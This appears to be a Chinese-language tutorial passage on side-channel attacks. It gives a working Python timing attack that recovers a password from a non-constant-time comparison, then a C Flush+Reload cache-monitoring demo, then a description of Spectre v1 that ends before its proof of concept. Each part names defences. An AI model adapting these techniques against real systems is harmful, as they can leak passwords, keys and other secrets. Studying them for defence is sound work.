import time
import string

def check_password(guess, secret="secret123"):
    # 模拟不安全的字符串比较（提前返回）
    for i in range(min(len(guess), len(secret))):
        if guess[i] != secret[i]:
            return False
    return len(guess) == len(secret)

def timing_attack():
    secret_len = 9  # 假设已知长度
    known = ""
    charset = string.ascii_lowercase + string.digits
    for pos in range(secret_len):
        times = {}
        for ch in charset:
            trial = known + ch + "a" * (secret_len - pos - 1)  # 填充至相同长度
            start = time.perf_counter()
            for _ in range(1000):  # 多次测量取平均
                check_password(trial)
            end = time.perf_counter()
            times[ch] = (end - start) / 1000
        # 选择耗时最长的字符（匹配更多字符导致更长比较）
        best = max(times, key=times.get)
        known += best
        print(f"Position {pos}: guessed '{best}', current: {known}")
    return known

if __name__ == "__main__":
    print("Secret:", timing_attack())


该代码通过测量1000次比较的平均时间，选择耗时最长的字符作为正确猜测。实际攻击中需考虑噪声、网络延迟等，但原理相同。防御方法包括使用常量时间比较（如`hmac.compare_digest`）或引入随机延迟。

Flush+Reload是一种基于缓存的侧信道攻击，利用共享内存（如动态库）和缓存一致性协议。攻击者与受害者共享同一物理页面（例如通过`mmap`映射共享库）。攻击步骤：1) Flush：攻击者使用`clflush`指令将目标缓存行从所有缓存级别中清除；2) Wait：等待一段时间，让受害者可能访问该内存；3) Reload：攻击者重新读取该内存地址，测量访问时间。如果受害者访问过该地址，数据会重新加载到缓存中，Reload时间短；否则需要从主存读取，时间长。通过时间差异，攻击者可以推断受害者的访问模式。

以下C代码演示如何监控一个共享变量（例如`shared_var`）的访问。假设攻击者和受害者运行在同一CPU核心上（或使用共享LLC）。

c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

#define CACHE_LINE_SIZE 64
#define THRESHOLD 100  // 缓存命中时间阈值（cycles）

volatile int *shared_var;

void flush_reload_monitor() {
    uint64_t start, end, diff;
    while (1) {
        // Flush目标地址
        _mm_clflush(shared_var);
        _mm_mfence();

        // 等待受害者可能访问
        usleep(100);  // 微秒级等待

        // Reload并测量时间
        start = __rdtsc();
        volatile int tmp = *shared_var;  // 强制读取
        end = __rdtsc();
        diff = end - start;

        if (diff < THRESHOLD) {
            printf("Victim accessed shared_var! Time: %lu cycles\n", diff);
        }
    }
}

int main() {
    // 创建共享内存（模拟共享库映射）
    int fd = open("/dev/zero", O_RDWR);
    shared_var = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    *shared_var = 0xdeadbeef;

    printf("Monitoring shared_var at %p\n", shared_var);
    flush_reload_monitor();

    munmap((void*)shared_var, 4096);
    return 0;
}


该代码持续Flush目标地址，等待后Reload，若时间低于阈值则判定受害者访问过。实际攻击中需考虑缓存层级、多核、SMT等影响。防御方法包括禁用共享内存、使用缓存分区（如Intel CAT）或使用常量时间访问模式。

Spectre v1（CVE-2017-5753）利用现代CPU的分支预测和乱序执行机制。攻击者通过训练分支预测器使其总是预测为真，然后提供越界输入，CPU在边界检查结果出来前会乱序执行后续代码，访问越界内存。虽然最终结果会被回滚，但缓存状态会被修改。攻击者通过Flush+Reload检测缓存变化，从而泄露敏感数据。

以下POC演示如何利用Spectre v1读取受害者进程内存中的秘密字节。假设受害者进程有一个数组`buffer`和边界检查函数，攻击者通过训练使其预测为真，然后传入越界索引，利用Flush+Reload检测缓存行。

